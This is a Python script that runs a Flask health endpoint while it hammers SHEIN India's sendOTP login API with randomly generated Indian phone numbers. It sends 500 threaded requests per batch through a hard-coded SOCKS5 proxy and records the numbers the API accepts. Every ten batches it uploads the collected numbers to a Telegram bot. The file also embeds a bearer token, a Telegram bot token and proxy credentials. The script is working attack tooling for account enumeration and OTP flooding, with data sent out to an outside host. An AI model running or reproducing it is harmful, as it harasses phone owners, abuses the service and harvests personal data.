import requests
import random
import time
import json
import threading
import os
from flask import Flask

# Initialize Flask for Render health checks
app = Flask(__name__)

# --- CONFIGURATION (UPDATE THESE) ---
URL = "https://api.sheinindia.in/uaas/login/sendOTP?client_type=Android%2F35&client_version=1.0.12"
TELEGRAM_TOKEN = "7765850713:AAHlPOY61yfDEK_9juqC6CilUSBUbUsJNa8"
TELEGRAM_CHAT_ID = "7177581474"
OUTPUT_FILE = "nm.json"
LOCK = threading.Lock()

# Proxy Credentials (SOCKS5)
PROXY_USER = "nooblog"
PROXY_PASS = "nooblog123"
PROXY_HOST = "138.197.67.46"
PROXY_PORT = "11001"

# Global proxy dictionary
PROXY_URL = f"socks5://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
PROXIES = {
    "http": PROXY_URL,
    "https": PROXY_URL
}

HEADERS = {
    "X-Tenant": "B2C",
    "Accept": "application/json",
    "User-Agent": "Android",
    "client_type": "Android/35",
    "client_version": "1.0.12",
    "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJjbGllbnQiLCJjbGllbnROYW1lIjoidHJ1c3RlZF9jbGllbnQiLCJyb2xlcyI6W3sibmFtZSI6IlJPTEVfVFJVU1RFRF9DTElFTlQifV0sInRlbmFudElkIjoiU0hFSU4iLCJleHAiOjE3NzE3ODE4MDQsImlhdCI6MTc2OTE4OTgwNH0.HsDutIjo9XEnC6Ju1_MZsjj3v-T52_2K4L0RKdnsNncEAjlNEA4MDEA39yLiGdaDzvNSmAy3fKgQcWE_WTC0RvPhL4_F9bzAFoK6LASjb1LzOKilHAdlFQtUDfZPgCdq9iXg95-v2-qv3vjoF2K47I7i9v_v8EKXO_OfqQILDyBzIqumYE3VRpDG1zJhIUijuDkmIrfsz8w-0m40gccXfsnN5IeRwp_l98l-amUfDs1bI167oWEBi-gGby7Fqzku8FxCicZ17cwhiWTs8kzopkKP1H50cFMBmH7cZR-WNbM_0OBdj4IcxT-2jHm-qoqMCGykud33KFLU2PfS8VU45g",
    "X-TENANT-ID": "SHEIN",
    "ad_id": "ec93c81f-af32-44c6-b1a0-3da640a4a459",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept-Encoding": "gzip"
}

def get_current_ip():
    """Helper to verify proxy is working."""
    try:
        r = requests.get("https://api.ipify.org?format=json", proxies=PROXIES, timeout=10)
        return r.json().get("ip", "Unknown")
    except Exception:
        return "Connection Error"

def send_to_telegram():
    """Sends the nm.json file and then clears it to save space."""
    if os.path.exists(OUTPUT_FILE):
        tg_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
        try:
            with open(OUTPUT_FILE, "rb") as f:
                r = requests.post(tg_url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": "Batch Results"}, files={"document": f}, timeout=15)
            
            # Optional: Clear the file after successful send to prevent it from growing too large
            if r.status_code == 200:
                with LOCK:
                    with open(OUTPUT_FILE, "w") as f:
                        json.dump([], f)
                print("Telegram file sent and local JSON cleared.")
        except Exception as e:
            print(f"Telegram Error: {e}")

def random_indian_number():
    start = random.choice([str(i) for i in range(70, 80)] + [str(i) for i in range(90, 100)])
    return start + str(random.randint(10000000, 99999999))

def save_number(num):
    with LOCK:
        data = []
        if os.path.exists(OUTPUT_FILE):
            with open(OUTPUT_FILE, "r") as f:
                try: data = json.load(f)
                except: pass
        if num not in data:
            data.append(num)
        with open(OUTPUT_FILE, "w") as f:
            json.dump(data, f, indent=2)

def make_request():
    number = random_indian_number()
    data = f"mobileNumber={number}"
    try:
        # verify=True is standard; if your site has SSL issues, change to False
        r = requests.post(URL, headers=HEADERS, data=data, timeout=30, proxies=PROXIES)
        if r.status_code == 200:
            try:
                if r.json().get("success") is True:
                    save_number(number)
                    print(f"[SUCCESS] {number}")
            except: pass
    except: pass

def run_heavy_load():
    last_rotation = time.time()
    batch_count = 0
    
    print(f"Bot Initialized. Current Exit IP: {get_current_ip()}")

    while True:
        # Proxy Rotation/Refresh logic every 2 minutes
        if time.time() - last_rotation > 120:
            print(f"Rotating Proxy/Checking IP: {get_current_ip()}")
            last_rotation = time.time()

        # Launching your original 500 threads
        threads = []
        for _ in range(500):
            t = threading.Thread(target=make_request)
            t.daemon = True
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        batch_count += 1
        
        # Send to Telegram every 10 batches (5,000 numbers checked)
        if batch_count >= 10:
            send_to_telegram()
            batch_count = 0
            
        time.sleep(1)

@app.route('/')
def health():
    return "Bot is running. High-concurrency mode active.", 200

if __name__ == "__main__":
    # Start the worker thread
    worker = threading.Thread(target=run_heavy_load, daemon=True)
    worker.start()
    
    # Run Flask server
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
